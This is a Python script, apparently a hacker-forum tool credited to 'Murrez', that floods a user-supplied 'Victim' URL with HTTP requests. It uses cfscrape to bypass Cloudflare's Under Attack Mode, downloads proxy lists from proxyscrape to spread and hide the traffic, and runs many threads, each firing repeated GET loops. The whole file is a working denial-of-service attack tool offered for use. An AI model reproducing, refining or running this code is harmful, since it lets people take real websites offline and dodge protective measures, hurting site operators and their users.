import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
#sudo pip3 install colorama cfscrape

os.system('clear')
print(Fore.WHITE + """  
    
     __ __   ____    __  __  _    ___  ____   __ __  __ __  ____   ____  
    |  T  T /    T  /  ]|  l/ ]  /  _]|    \ |  T  T|  T  T|    \ |    \ 
    |  l  |Y  o  | /  / |  ' /  /  [_ |  D  )|  l  ||  |  ||  o  )|  o  )
    |  _  ||     |/  /  |    \ Y    _]|    / |  _  ||  |  ||     T|     T
    |  |  ||  _  /   \_ |     Y|   [_ |    \ |  |  ||  :  ||  O  ||  O  |
    |  |  ||  |  \     ||  .  ||     T|  .  Y|  |  |l     ||     ||     |
    l__j__jl__j__j\____jl__j\_jl_____jl__j\_jl__j__j \__,_jl_____jl_____j
    
                           Created Murrez
                           
                     [+] CloudFlare UAM Bypass [+]
                          
            instagram.com/murrez.sec ~ fb.com/murrez.sec
            
                       hackerhubb.blogspot.com

""")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print(" Thread Id = " + str(a+1) + " ")
	print(Fore.RED + " Waiting ....")
	time.sleep(2)
	input(Fore.CYAN + " Press Enter ..")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + " Victim : " + Fore.YELLOW))
	ssl = str(input(Fore.GREEN + " HTTPS ? [Y/N] : " + Fore.YELLOW))
	ge = str(input(Fore.GREEN + " Grabbed Proxy? ? (Y/N) : " + Fore.YELLOW))
	if ge =='Y':
		if ssl == 'Y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000')
			with open('proxy-murrez.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.GREEN + " [+] Grabbed Successful")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&country=all&anonymity=all&ssl=all&timeout=1000')
			with open('proxy-murrez.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.GREEN + " [+] Grabbed Successful")
	else:
		pass
	list = str(input(Fore.GREEN + " Proxy List (proxy-murrez.txt) : " + Fore.YELLOW))
	pprr = open(list).readlines()
	print(Fore.GREEN + " Number of Proxies : " + Fore.YELLOW + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + " Thread : " + Fore.YELLOW))
	per = int(input(Fore.GREEN + " Socket : " + Fore.YELLOW))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + " JSBYPASS & CF BYPASS  -> " + Fore.YELLOW + str(url)+ Fore.CYAN + " Connect :3 " +Fore.YELLOW+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + " JSBYPASS & CF BYPASS -> " + Fore.YELLOW + str(url)+Fore.CYAN + " Connect :3 " +Fore.YELLOW + str(proxy[0])+":"+str(proxy[1]))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + " Dead Proxy -> " +Fore.RED + str(proxy[0])+":"+str(proxy[1]))


if __name__ == "__main__":
	main()
